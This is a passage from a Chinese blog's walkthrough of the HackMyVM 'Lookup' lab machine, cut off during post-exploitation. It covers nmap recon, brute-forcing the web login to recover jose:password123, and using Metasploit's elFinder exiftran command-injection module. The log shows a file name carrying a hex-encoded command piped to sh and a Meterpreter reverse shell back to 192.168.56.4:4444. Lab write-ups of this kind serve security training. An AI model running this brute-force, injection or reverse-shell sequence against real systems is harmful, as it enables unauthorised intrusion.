<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/4585c0f8fb921bfa.css" as="style"/><link rel="stylesheet" href="/_next/static/css/4585c0f8fb921bfa.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/KSU3L3f1YqmRGxnWHKn0l/_buildManifest.js" defer=""></script><script src="/_next/static/KSU3L3f1YqmRGxnWHKn0l/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMLookup","contentHtml":"\u003ch1\u003eLookup.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Lookup\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Lookup\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes: \u003cstrong\u003eEnjoy it.\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/test  nmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                      \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00069\u003c/span\u003es latency).\nMAC Address: 0A:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00044\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:D5:\u003cspan class=\"hljs-number\"\u003e61\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e82\u003c/span\u003e (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www.smol.hmv (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e)\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00051\u003c/span\u003es latency).\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:E7:07:A1 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up.\nNmap done: \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e IP addresses (\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15.08\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/test  nmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e                          \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www.smol.hmv (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e)\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00051\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:E7:07:A1 (Oracle VirtualBox virtual NIC)\n\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e4.14\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e⚡ root@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 03:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www.smol.hmv (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e)\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00053\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003ep1 Ubuntu 4ubuntu0\u003cspan class=\"hljs-number\"\u003e.9\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n| ssh-hostkey: \n|   \u003cspan class=\"hljs-number\"\u003e3072\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e:5f:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e67\u003c/span\u003e:4b:4a:\u003cspan class=\"hljs-number\"\u003e91\u003c/span\u003e:9b:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:7a:\u003cspan class=\"hljs-number\"\u003e95\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e59\u003c/span\u003e:c8:4c:2e:04 (RSA)\n|   \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e 0a:4b:b9:b1:\u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e:d2:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e79\u003c/span\u003e:fc:2f:8a:3d:\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e:3a:ad:\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e (ECDSA)\n|_  \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e d3:3b:\u003cspan class=\"hljs-number\"\u003e97\u003c/span\u003e:ea:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e:bc:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e:4d:03:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e:f6:8f:ad:b6:a0:fb (ED25519)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e ((Ubuntu))\n|_http-title: Did \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e follow redirect to http://lookup.hmv\n|_http-server-header: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.41\u003c/span\u003e (Ubuntu)\nMAC Address: 08:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:E7:07:A1 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003eX|\u003cspan class=\"hljs-number\"\u003e5.\u003c/span\u003eX\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e4.15\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.8\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e0.53\u003c/span\u003e ms www.smol.hmv (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e)\n\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e incorrect results at https://nmap.org/submit/ .\nNmap done: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e IP address (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e8.37\u003c/span\u003e seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e服务，并收集指纹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLookup/image118.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eBrute\u003c/h2\u003e\n\u003cp\u003e尝试了\u003ccode\u003eSQL\u003c/code\u003e注入等常规操作后无结果\u003c/p\u003e\n\u003cp\u003e尝试了用户\u003ccode\u003eadmin\u003c/code\u003e，爆破密码，最后\u003ccode\u003epassword123\u003c/code\u003e的数据包和别的数据包返回不一样\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLookup/image119.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLookup/image120.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那么密码应该是对的，现在继续爆破用户名\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLookup/image121.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到用户名密码\u003ccode\u003ejose:password123\u003c/code\u003e ,登陆后跳转到\u003ccode\u003efiles.lookup.hmv\u003c/code\u003e ，将其添加到\u003ccode\u003ehosts\u003c/code\u003e文件\u003c/p\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003cp\u003e登陆进去后，是一个文件管理的系统\u003ccode\u003eelFinder\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLookup/image122.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLookup/image123.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e搜索漏洞，刚好靶机的版本存在远程命令执行漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLookup/image124.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eMSF\u003c/code\u003e搜索，并利用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 \u003e search elFinder\n                                                         \nMatching Modules                                \n================                                                                                                  \n                                                         \n   \u003cspan class=\"hljs-comment\"\u003e#  Name                                                               Disclosure Date  Rank       Check  Description\u003c/span\u003e\n   -  ----                                                               ---------------  ----       -----  -----------\n   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  exploit/multi/http/builderengine_upload_exec                       \u003cspan class=\"hljs-number\"\u003e2016\u003c/span\u003e-09-\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e execution\n   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e  exploit/unix/webapp/tikiwiki_upload_exec                           \u003cspan class=\"hljs-number\"\u003e2016\u003c/span\u003e-07-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability\n   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e  exploit/multi/http/wp_file_manager_rce                             \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution\n   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e  exploit/linux/http/elfinder_archive_cmd_injection                  \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e-06-\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e       excellent  Yes    elFinder Archive Command Injection\n   \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e       excellent  Yes    elFinder PHP Connector exiftran Command Injection\n\nInteract \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e a module by name \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e index. For example info \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, use \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection\n\nmsf6 \u003e use \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\nmsf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) \u003e options\n\nModule options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   Proxies                     no        A proxy chain of \u003cspan class=\"hljs-built_in\"\u003eformat\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e:host:port[,\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e:host:port][...]\n   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT      \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e               yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e outgoing connections\n   TARGETURI  /elFinder/       yes       The base path to elFinder\n   VHOST                       no        HTTP server virtual host\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e     yes       The listen address (an interface may be specified)\n   LPORT  \u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e   Auto\n\nView the full module info \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e the info, \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e info -d command.\n\nmsf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\nrhosts =\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e  \nmsf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e vhost files.lookup.hmv\nvhost =\u003e files.lookup.hmv    \nmsf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) \u003e run\n\n[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e \n[*] Uploading payload \u003cspan class=\"hljs-string\"\u003e'adB6JwtTYi.jpg;echo 6370202e2e2f66696c65732f616442364a77745459692e6a70672a6563686f2a202e5a5258637867743064302e706870 |xxd -r -p |sh\u0026#x26; #.jpg'\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e1953\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e)\n[*] Triggering vulnerability via image rotation ...\n[*] Executing payload (/elFinder/php/.ZRXcxgt0d0.php) ...\n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e40004\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e\n[+] Deleted .ZRXcxgt0d0.php\n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39778\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-02-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 04:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e -0500\n[*] No reply\n[*] Removing uploaded file ...\n[+] Deleted uploaded file\n\nmeterpreter \u003e                                                                                                    \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - think\u003c/h2\u003e\n\u003cp\u003e先信息收集一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ uname -a\nLinux lookup \u003cspan class=\"hljs-number\"\u003e5.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e156\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\n$ ip add\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e65536\u003c/span\u003e qdisc noqueue state UNKNOWN group default qlen \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n    link/loopback \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan 